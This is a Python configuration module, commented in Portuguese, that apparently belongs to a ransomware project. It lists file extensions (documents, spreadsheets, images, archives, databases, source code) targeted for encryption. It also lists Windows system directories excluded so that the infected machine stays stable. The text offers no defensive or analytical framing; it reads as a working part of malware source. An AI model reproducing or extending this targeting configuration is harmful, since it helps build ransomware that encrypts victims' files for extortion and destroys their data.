"""
Módulo de Configuração

Armazena constantes e configurações utilizadas em todo o projeto para facilitar a manutenção.
"""

# Lista de extensões de arquivo alvo para criptografia
TARGET_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
    '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
    '.zip', '.rar', '.sql', '.csv', '.json', '.xml',
    '.html', '.css', '.js', '.py', '.java', '.cpp'
]

# Lista de diretórios de sistema a serem excluídos da criptografia para evitar instabilidade
# A verificação é case-insensitive
EXCLUDED_SYSTEM_DIRS = [
    'C:\\Windows',
    'C:\\Program Files',
    'C:\\Program Files (x86)',
    '$Recycle.Bin',
    'System Volume Information',
    'Recovery',
    'AppData\\' 
]